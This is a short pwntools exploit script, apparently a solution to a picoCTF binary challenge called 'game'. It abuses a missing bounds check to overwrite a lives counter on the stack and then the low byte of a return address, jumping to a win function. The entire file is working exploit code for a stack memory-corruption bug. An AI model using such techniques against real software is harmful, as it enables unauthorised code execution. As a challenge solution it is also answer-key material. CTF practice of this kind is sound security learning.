from pwn import *

e = ELF('./game')

context.binary = e

#p = process(e.path)
p = remote('rhea.picoctf.net', 53518)

def move(c):
    p.sendlineafter(b'X', c)

def overlife():
    #use lack of bound check overwrite lives on stack

    move(b'l' + p8(0x7f))
    for i in range(8):
        move('a')

    for i in range(4):
        move('w')

    move('s')

def solround():
    #get inf life

    overlife()

    #now auto finish

    move('p')

def jmpround(x, y):
    #get inf life

    overlife()

    #write bottom byte move_player return addr to jmp

    for i in range(3 + 0x4 * x):
        move('a')

    move(b'l' + p8(y))
    move('w')

#solve 3 rounds

for i in range(3):
    solround()

#4th overwrite to jmp inside main and +1 on level, round resets

jmpround(11, 0x86)

#now overwrite to jump straight to win

jmpround(15, 0xfe)

#pray for flag

p.interactive()
